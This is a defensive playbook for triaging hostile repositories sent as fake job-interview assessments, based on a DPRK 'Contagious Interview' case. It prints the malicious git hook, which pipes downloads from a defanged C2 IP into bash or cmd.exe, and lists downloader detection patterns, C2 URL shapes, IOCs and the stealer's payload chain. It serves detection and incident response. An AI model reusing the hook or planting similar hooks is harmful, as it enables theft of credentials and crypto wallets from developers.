# Hostile Repository Playbook

> Companion to **SKILL.md → Phase 0.0 (Hostile Repository Triage)**.
> Use this whenever the code under review came from an untrusted party: a recruiter's take-home test,
> a freelance client's "existing project", a bounty submission, or a ZIP/tarball from a chat or Drive link.
> Last updated: 2026-11-14.

---

## 1. Why this exists — the reference case

In November 2026 a developer received a "Prepaire Labs developer exercise" (a real company's name used without its involvement).
It was a ZIP of a Git repository **including its `.git/` folder**. All the tracked code on every branch was harmless decoy work.
The payload sat in four **untracked** files that `git clone` never transfers and that GitHub never displays:

```
assessment/.git/hooks/post-checkout     ┐
assessment/.git/hooks/pre-commit        │  byte-identical, 439 bytes
assessment/.git/hooks/post-commit       │  SHA-256 d825a1ff12cb26ac77714ab07328fe24bc3fd1aae161148186c37078a5fe21cb
assessment/.git/hooks/pre-merge-commit  ┘
```

```bash
#!/bin/bash
case "$(uname -s)" in
  Darwin*) curl -sL 'hxxp://45[.]61[.]134[.]57:8080/task/mac?id=483' -L | bash > /dev/null 2>&1 & ;;
  Linux*)  wget -qO- 'hxxp://45[.]61[.]134[.]57:8080/task/linux?id=483' -L | bash > /dev/null 2>&1 & ;;
  MINGW*|MSYS*CYGWIN*) curl -sL hxxp://45[.]61[.]134[.]57:8080/task/windows?id=483 -L | cmd.exe > /dev/null 2>&1 & ;;
  *)       curl -sL 'hxxp://45[.]61[.]134[.]57:8080/task/mac?id=483' -L | bash > /dev/null 2>&1 & ;;
esac
```

The task instructions told the candidate to `git checkout` four branches and then commit, which fired the hooks up to six times.
The same C2 and `id=483` had already appeared in a different lure (Web3 game "MMON", Aug 2026), so the `id` labels an operator bucket, not a victim.
The campaign is DPRK **Contagious Interview** (MITRE ATT&CK **G1052**; also called Famous Chollima, DeceptiveDevelopment, WaterPlum).

**Lessons encoded in this playbook:**
1. A repository is an executable artifact. `.git/hooks`, `.git/config`, IDE task files and package lifecycle scripts all run code.
2. Hooks are the same for every branch: one `.git/hooks/` directory per repository. Switching to a "clean" branch changes nothing.
3. Shipping `.git` inside an archive is the only way hooks can reach a victim. That alone is a red flag.
4. Inspecting with git (checkout, log -p with textconv, status with fsmonitor) can trigger the trap. Inspect as plain files first.

---

## 2. Safe-handling rules (non-negotiable)

| Do | Don't |
|---|---|
| List archives without extracting: `unzip -l x.zip`, `tar -tvf x.tgz` | Double-click / auto-extract into your home folder |
| Run `python ci/hostile_repo_scan.py <dir-or-archive>` first | Run any `git` command before the scan is clean |
| If you must use git: `git -c core.hooksPath=/dev/null -c core.fsmonitor=false ...` | Rely on `--no-verify` (it does not stop `post-commit`, `post-checkout`, `prepare-commit-msg`) |
| Read hooks with `cat`/`less` | `chmod +x`, `source`, or execute anything to "see what it does" |
| Open untrusted folders in VS Code **Restricted Mode**; enable Workspace Trust in Cursor (off by default) | Open in an IDE with auto-run tasks enabled |
| Install deps with `npm ci --ignore-scripts` / in a disposable VM | `npm install`, `pip install .`, `make`, `docker compose up` on the host |
| Analyse in a throwaway VM with no SSH keys, wallets, browser profiles or cloud credentials | Use your daily workstation |
| Fetch suspected stage-2 payloads only from an isolated analysis network, saving with `-o`, never piping | `curl ... | bash` to "check" a URL |

---

## 3. Triage procedure

### 3.1 Automated scan (no execution, no extraction)

```bash
python ci/hostile_repo_scan.py ~/Downloads/assessment.zip -o .audit/hostile-repo.json
#   exit 0 = no hostile indicators   1 = CRITICAL/HIGH → stop   2 = scan error
```

Checks performed (IDs appear in findings):

| Check | Detects | Typical severity |
|---|---|---|
| `HR-HOOK` | Active (non-`.sample`) hooks in `.git/hooks`, `.git/modules/*/hooks`, `.git/worktrees/*/hooks`; downloader / C2 / IOC content; executable bit; which git action fires it | CRITICAL with payload, else HIGH |
| `HR-SAMPLE` | `*.sample` files containing payloads, or non-stock sample names (renamed-sample trick) | CRITICAL / MEDIUM |
| `HR-GITCFG` | Repo-local config that runs commands: `core.hooksPath`, `core.fsmonitor`, `core.sshCommand`, `core.pager/editor`, `filter.*.smudge/clean/process`, `diff.*.textconv`, `merge.*.driver`, `include.path`, `!`-aliases | CRITICAL–LOW |
| `HR-TRACKED` | Tracked hook dirs (`.githooks/`, `.husky/`, `githooks/`) with downloaders, armed by `git config core.hooksPath` in a README | CRITICAL |
| `HR-IDE` | `.vscode/tasks.json` `runOn: folderOpen`; devcontainer `initializeCommand` (runs on the host) and other lifecycle commands | CRITICAL–LOW |
| `HR-PKG` | npm `preinstall/install/postinstall/prepare` with downloaders or `node -e`; `setup.py` with network or exec | CRITICAL–LOW |
| `HR-DLX` | `curl|bash`, `wget -O-|sh`, `iwr|iex`, `bash -c "$(curl …)"`, `base64 -d | sh` (LOW in docs) | HIGH |
| `HR-C2URL` | `/task/<os>?id=`, `/task/tokenlinux?`, `/settings/<os>?flag=`, `vercel.app/api/{m,l,w}`, `/30x/30x{m,l,w}` | CRITICAL |
| `HR-IOC` | IPs, domains, hashes and strings from `references/iocs/*.json` | CRITICAL |
| `HR-RAWIP` | Hard-coded public raw-IP URLs | MEDIUM |
| `HR-OBF` | Heavily obfuscated JS (`_0x…` identifiers, giant eval lines) | HIGH |
| `HR-ARCHIVE` | Archive ships a `.git/` directory | HIGH with hooks, else MEDIUM |
| `HR-ARTIFACT` | Operator artifacts: `.git/cursor/` IDE index, reflog identities | INFO |

### 3.2 Manual confirmation (read-only)

```bash
# Archive: look before you extract
unzip -l assessment.zip | grep -E '\.git/(hooks|config)|\.vscode/|package\.json|\.githooks|\.husky'

# Extracted copy: non-sample hooks and their exec bit
find . -path '*/.git/*hooks/*' -type f ! -name '*.sample' -exec ls -l {} \;
find . -path '*/.git/*hooks/*' -type f ! -name '*.sample' -exec sh -c 'echo "== $1"; cat -v "$1"' _ {} \;

# Repo-local config keys that execute commands
grep -nEi 'hookspath|fsmonitor|sshcommand|gitproxy|pager|editor|askpass|textconv|smudge|clean|process|driver|include|!' .git/config

# IDE / package auto-run
grep -rn '"runOn"[[:space:]]*:[[:space:]]*"folderOpen"' --include=tasks.json .
grep -rn '"initializeCommand"\|"postCreateCommand"' --include='*devcontainer*.json' .
python3 -c "import json;print(json.load(open('package.json')).get('scripts',{}))" 2>/dev/null

# YARA (if installed)
yara -r rules/yara/git_hook_dropper.yar .
```

### 3.3 Decision

```
scan exit 0 ───────────────► proceed to Phase 0 (normal audit), still in a VM if the source is untrusted
scan exit 1, nothing run ──► HOSTILE. Do not run git/IDE/npm. Report the IOCs (Section 6). Delete or quarantine.
scan exit 1, git/IDE/npm ──► INCIDENT. Go to Section 4 now.
   already used on a host
```

---

## 4. Incident response (a hostile repo was used on a real machine)

### 4.1 What executed

| User action | Hooks fired | Stager runs |
|---|---|---|
| each `git checkout` / `git switch` | `post-checkout` | 1 |
| `git commit` | `pre-commit` + `post-commit` (+ `prepare-commit-msg`, `commit-msg` if present) | 2+ |
| `git merge` creating a commit | `pre-merge-commit` (`post-merge` if present) | 1 |
| `git pull` | `post-merge` | 1 |

Git ignores hooks without the executable bit. Check `ls -l .git/hooks` on the affected machine. If the hooks are executable, assume they ran.

### 4.2 Likely payload chain on macOS (inferred from published analyses of the same URL scheme)

```
hook ── curl /task/mac?id=N | bash
          └─► stager writes ~/.task/ or ~/Documents/tokenlinux.{npl,sh} ─► nohup bash tokenlinux.sh &
                 └─► downloads Node.js + /task/parser (parser.js) + /task/json ("tokendapp" package.json)
                        └─► npm install ─► nohup node parser.js > parser.log &   (process title "npm-cache")
                               = OtterCookie: Socket.IO RAT + stealer
                                 • Chrome/Brave/Edge/Opera Login Data, Web Data, cookies
                                 • 25 wallet-extension LevelDBs (MetaMask, Phantom, …)
                                 • ~/Library/Keychains/login.keychain-db
                                 • *.env*, *.pem, .ssh, .aws, .azure, .config, shell history, source
                                 • clipboard via pbpaste every 500 ms
                                 • exfil HTTP POST /upload, /cldbs; FTP; Socket.IO C2 (often a different IP)
               optional follow-on: InvisibleFerret (~/.n2/, AnyDesk, LaunchAgent com.avatar.update.wake.plist)
```

The base `/task/` chain persists only via `nohup`, which does not survive a reboot. Theft is complete within minutes, so treat the machine as fully compromised regardless.

### 4.3 Response order

1. **Contain.** Take the machine off the network and keep it powered on. Don't log in to anything from it.
2. **Preserve.** Run `bash ir/macos-triage.sh <repo-path> <date-received>`. It is read-only and writes `~/Desktop/triage-*.txt`. Also run `log collect --last 7d` and `sudo sfltool dumpbtm`, and copy the repo with its `.git`. **Never run `sfltool resetbtm`**: it destroys login-item evidence.
3. **Scope.** Check hook exec bits, `~/.task`, `~/Documents/tokenlinux.*`, `~/parser.js`/`parser.log`, a "tokendapp" `package.json`, `~/.n2`, `~/.npl`, LaunchAgents, AnyDesk, and shell rc edits. Check router/DNS/proxy logs for the C2 and for unusual egress from `node`/`python`.
4. **Rotate, from a clean device, in this order:**
   1. crypto: move funds to wallets with **new seed phrases** created on a clean device
   2. email / Apple ID / SSO: change passwords, sign out all sessions, re-enrol MFA
   3. GitHub (PATs, OAuth apps, SSH and deploy keys), npm/PyPI tokens, cloud access keys
   4. SSH keys and `authorized_keys` on every server
   5. secrets in every local `.env`
   6. browser-saved passwords, then all other Keychain items
5. **Hunt.** Review the GitHub audit log, cloud audit trails (new keys or users), npm publish history and mail forwarding rules.
6. **Eradicate.** Erase the disk and reinstall the OS. Restore documents only, not apps, dotfiles or Node installs.
7. **Report.** Notify the employer SOC if work assets were involved. File with FBI IC3 (reference "Contagious Interview / WaterPlum") or your national CERT (Brazil: CERT.br, `cert@cert.br`). Report the recruiter profile to the platform, and tell the impersonated company. Submit the hashes and C2 to URLhaus, ThreatFox and OTX. Assess LGPD/GDPR obligations if client data was on the machine.

Windows and Linux use the same order. On Linux, check `~/.config/autostart`, systemd `--user` units and crontab. On Windows, check Run keys, Scheduled Tasks and `%APPDATA%` Node/Python installs.

---

## 5. Detection engineering

| Asset | Path | Notes |
|---|---|---|
| Static scanner | `ci/hostile_repo_scan.py` | stdlib only; dirs, zip, tar; JSON report compatible with findings schema |
| YARA | `rules/yara/git_hook_dropper.yar` | OS-switch hook, loader URL shapes, known hook hash, known C2, OtterCookie artifacts |
| Sigma (macOS) | `rules/sigma/git_hook_spawns_downloader_macos.yml` | experimental; closes the macOS gap (published Elastic hook rules are Linux-only) |
| Sigma (Linux) | `rules/sigma/git_hook_spawns_downloader_linux.yml` | experimental |
| IOCs | `references/iocs/contagious-interview.json` | loaded by the scanner automatically |
| macOS triage | `ir/macos-triage.sh` | read-only evidence collection |

Published third-party content worth enabling:

| Source | Rule | Platform |
|---|---|---|
| Elastic detection-rules | Git Hook Command Execution `dc61f382-dc0c-4cc0-a845-069f2a071704`; Git Hook Child Process `7ce5e1c7-6a49-45e6-a101-0720d185667f`; Git Hook Egress Network Connection `9822c5a1-1494-42de-b197-487197bb540c`; Git Hook Created or Modified `ac531fcc-1d3b-476d-bbb5-1357728c9a37` | Linux |
| Elastic detection-rules | Pbpaste Execution via Unusual Parent `d7182e12-df8f-4ecf-b8f8-7cc0adcec425` (names OtterCookie); Script Interpreter Connection to Non-Standard Port `aa1e007a-2997-4247-b048-dd9344742560` | macOS |
| Elastic protections-artifacts | Payload Piped to Script Interpreter `e413073c-4d6b-40d4-9ef1-b4de22d137d3`; Crypto Wallet or Web Browser File Access via Nodejs `555ec79a-b570-455e-aac9-d2df587d70bf`; YARA `MacOS_Trojan_BeaverTail_90b8abd6` | macOS |
| JPCERT/CC | `Lazarus/contagiousinterview.yara` (OtterCookie downloader + JS) | any |

### ATT&CK mapping (G1052 = listed by MITRE for the group; A = analyst mapping)

| Stage | Technique |
|---|---|
| Fake recruiter / company | T1566.003 (G1052), T1585.001 (A) |
| Victim runs git on supplied repo | T1204.002 (G1052) |
| Hook as event-triggered execution | T1546 (A; ATT&CK has no Git-hook sub-technique) |
| `curl … | bash` | T1059.004 (G1052), T1105 (A) |
| `node parser.js` / Python implants | T1059.007, T1059.006 (G1052) |
| Masquerade as `npm-cache`, obfuscation | T1036 (A), T1027 (G1052) |
| Keychain, browser credentials, cookies | T1555.001 (G1052), T1555.003 (A), T1539 (A) |
| Clipboard, secret files | T1115 (A), T1552.001 (G1052) |
| Exfiltration | T1041, T1048.003, T1567 (G1052) |
| Follow-on persistence and remote access | T1543.001, T1546.004, T1219.002 (G1052) |

---

## 6. Known campaign variants (for hunting)

| Variant | Loader location | Stage-1 URL shape | Source |
|---|---|---|---|
| Prepaire Labs / MMON | all hooks in shipped `.git/hooks` | `45.61.134.57:8080/task/{os}?id=483` | first-hand; Pershyn 2026-08-26 |
| CITIZENDOT | 22 hooks in shipped `.git/hooks` | `45.61.164.38:5777/task/{os}?id=402` | citizendot.github.io 2026-07-23 |
| Trojanized macOS installers | DMG/PKG | `162.0.239.85:3000/task/mac?token=` (+JWT `st`) | Jamf 2026-09-03 |
| Vercel `/settings/` | `.githooks/` + `core.hooksPath` | `precommit.vercel.app/settings/{os}?flag=5` | OpenSourceMalware 2026-05-06 |
| Renamed `.sample` | `post-rebase.sample` called by live hooks | `cleverstack-ext30341.vercel.app/api/{m,l,w}` | mahmudul.dev 2026-06-03 |

Social-engineering tells reported by victims: a LinkedIn recruiter offering a high-paid Web3/DeFi/AI/fintech role under a real company's name; the repo arrives via Drive/Dropbox as an archive containing `.git`; the instructions *require* a branch checkout, commit or "NDA branch"; there's time pressure (30–60 min); the camera stays off; the claimed US location doesn't match working hours; the account is deleted once questioned.

---

## 7. References

- Pershyn, *Anatomy of a Web3 Interview Scam* (2026-08-26): https://medium.com/@eduard.pershyn/anatomy-of-a-web3-interview-scam-558d78e22b3d
- CITIZENDOT, *Fake job interview git hook malware* (2026-07-23): https://citizendot.github.io/articles/fake-job-interview-git-hook-malware/
- Jamf Threat Labs, *Contagious Interview trojanized macOS installers* (2026-09-03): https://www.jamf.com/blog/contagious-interview-trojanized-macos-installers/
- Elastic Security Labs, OtterCookie analysis: https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
- Microsoft, *Contagious Interview malware delivered through fake developer job interviews* (2026-03-11): https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
- OpenSourceMalware, *DPRK git hooks malware* (2026-05-06): https://opensourcemalware.com/blog/dprk-git-hooks-malware
- MITRE ATT&CK G1052 Contagious Interview: https://attack.mitre.org/groups/G1052/ · S1245 InvisibleFerret · S1246 BeaverTail
- FBI and partners, *WaterPlum (Contagious Interview)* advisory (2026-09-18): https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/north-korean-waterplum-commonly-referred-to-as-contagious-interview-cyber-actor-group-targeting-it-professionals
- Git hooks documentation: https://git-scm.com/docs/githooks
